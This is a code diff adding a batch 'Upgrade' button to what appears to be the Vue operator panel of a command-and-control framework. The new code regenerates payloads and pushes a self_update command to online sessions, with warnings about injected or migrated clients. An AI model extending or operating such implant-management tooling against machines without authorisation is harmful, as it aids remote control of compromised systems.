@@ -44,6 +44,7 @@
         <button class="cs-btn cs-btn-xs" @click="batchSetGroup">{{ i18nStore.tl('批量分组', 'Set Group') }}</button>
         <button class="cs-btn cs-btn-xs" @click="openBatchTasks">{{ i18nStore.tl('任务中心', 'Tasks') }}</button>
         <button class="cs-btn cs-btn-xs" :disabled="!hasOfflineSelected" @click="cleanupOfflineBatch">{{ i18nStore.tl('清理离线', 'Clean Offline') }}</button>
+        <button class="cs-btn cs-btn-xs" :disabled="!hasOnlineSelected || upgrading" @click="upgradeSelected">{{ upgrading ? (i18nStore.tl('升级中...', 'Upgrading...')) : (i18nStore.tl('升级客户端', 'Upgrade')) }}</button>
         <button class="cs-btn cs-btn-xs" @click="clearTableSelection">{{ i18nStore.tl('取消选择', 'Clear') }}</button>
       </template>
 
@@ -793,6 +794,8 @@ function actCleanup(row: RowData) {
 
 const selectedRows = ref<RowData[]>([])
 const hasOfflineSelected = computed(() => selectedRows.value.some((r) => !isClientOnline(r)))
+const hasOnlineSelected = computed(() => selectedRows.value.some((r) => isClientOnline(r)))
+const upgrading = ref(false)
 
 function onSelectionChange(selection: RowData[]) {
   selectedRows.value = selection
@@ -806,6 +809,60 @@ function onSelectionChange(selection: RowData[]) {
 }
 
 // ===== C14 批量命令 / 分组 / 任务进度 =====
+
+// 升级客户端：重新生成载荷并下发 self_update（仅独立 EXE payload）
+async function upgradeSelected() {
+  const uids = selectedRows.value.filter((r) => isClientOnline(r)).map((r) => r.Uid)
+  if (!uids.length) {
+    ElMessage.warning(isZh.value ? '请选择在线会话' : 'Select online sessions first')
+    return
+  }
+  try {
+    await ElMessageBox.confirm(
+      isZh.value
+        ? `将为 ${uids.length} 个在线会话重新生成载荷并下发 self_update。
+
+仅适用于独立 EXE payload；DLL/注入/迁移形态会被服务端拒绝，旧客户端没有内置保护，误操作可能替换宿主程序文件。
+
+升级载荷不带上线口令，客户端替换后约 2 秒重启。确认继续？`
+        : `Regenerate payloads for ${uids.length} online session(s) and send self_update.
+
+Only for standalone EXE payloads; DLL/injected/migrated clients are rejected by the server. Old clients have no built-in guard — a wrong target can overwrite the host process file.
+
+The upgraded payload has no startup password; the client restarts in ~2s. Continue?`,
+      isZh.value ? '升级客户端' : 'Upgrade Clients',
+      { type: 'warning', confirmButtonText: isZh.value ? '确认升级' : 'Upgrade', cancelButtonText: isZh.value ? '取消' : 'Cancel' },
+    )
+  } catch {
+    return
+  }
+  upgrading.value = true
+  try {
+    const res = await ClientAPI.upgradeClients({ uids, confirm: true })
+    const data = res.data?.data
+    if (res.data?.status === 200 && data) {
+      const failed = (data.results || []).filter((r: any) => !r.ok)
+      if (failed.length) {
+        const detail = failed.map((r: any) => `${r.uid}: ${r.message}`).join('; ')
+        ElMessage.warning(
+          isZh.value
+            ? `已下发 ${data.succeeded} 个，失败 ${data.failed} 个：${detail}`
+            : `${data.succeeded} sent, ${data.failed} failed: ${detail}`,
+        )
+      } else {
+        ElMessage.success(isZh.value ? `已向 ${data.succeeded} 个会话下发升级命令` : `Upgrade command sent to ${data.succeeded} session(s)`)
+      }
+      clientsStore.refreshClients().catch(() => {})
+    } else {
+      ElMessage.error(res.data?.error || res.data?.data || (isZh.value ? '升级失败' : 'Upgrade failed'))
+    }
+  } catch (e: any) {
+    ElMessage.error(e?.response?.data?.error || e?.message || (isZh.value ? '升级失败' : 'Upgrade failed'))
+  } finally {
+    upgrading.value = false
+  }
+}
+
 const batchUids = computed(() => workspace.selectedUids)
 const batchCommandInput = ref('')
 const batchSending = ref(false)
